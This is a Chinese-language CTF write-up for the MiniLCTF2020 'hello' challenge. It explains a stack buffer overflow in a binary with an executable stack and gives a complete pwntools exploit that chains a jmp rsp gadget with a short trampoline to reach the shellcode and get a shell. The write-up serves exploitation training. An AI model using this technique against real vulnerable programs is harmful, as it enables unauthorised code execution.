# MiniLCTF2020 - hello

## 题目简述

64 位 ELF 的栈可执行、无 Canary、无 PIE。`vul()` 在 48 字节栈缓冲区中调用 `fgets(buf, 72, stdin)`，可以覆盖返回地址；程序还提供 `jmp rsp` gadget。由于溢出空间不足以把完整 shellcode 放在返回地址之后，需要先跳回缓冲区开头。

## 解题过程

当前仓库二进制的保护为：

```text
Arch: amd64
RELRO: Partial RELRO
Canary: No
NX: stack executable
PIE: No PIE
```

缓冲区位于 `rbp-0x30`，故到返回地址的偏移是 `0x30 + 8 = 56`。`bd()` 中有：

```asm
0x4006ca: jmp rsp
```

函数返回并跳到 `rsp` 时，`rsp` 比缓冲区起点高 64 字节。把 shellcode 放在缓冲区开头，返回地址写成 `0x4006ca`，其后放一个短跳板 `sub rsp, 0x40; jmp rsp`：

```python
from pwn import *

context.arch = 'amd64'
io = process('./pwn')

shellcode = asm(shellcraft.sh())
jmp_rsp = 0x4006ca
trampoline = asm('sub rsp, 0x40; jmp rsp')

payload = shellcode.ljust(56, b'A')
payload += p64(jmp_rsp)
payload += trampoline

io.sendlineafter(b"What's your name?", payload)
io.interactive()
```

执行顺序是“返回到 `jmp rsp`—执行短跳板—把栈指针减 64—跳到缓冲区 shellcode”，从而获得 shell。

## 方法总结

有限溢出长度下，应精确画出返回时 `rsp` 与缓冲区的位置关系。若栈可执行且有 `jmp rsp`，可以在返回地址后只放很短的栈调整 stub，把控制流送回返回地址之前的大块 shellcode，而不必构造长 ROP 链。
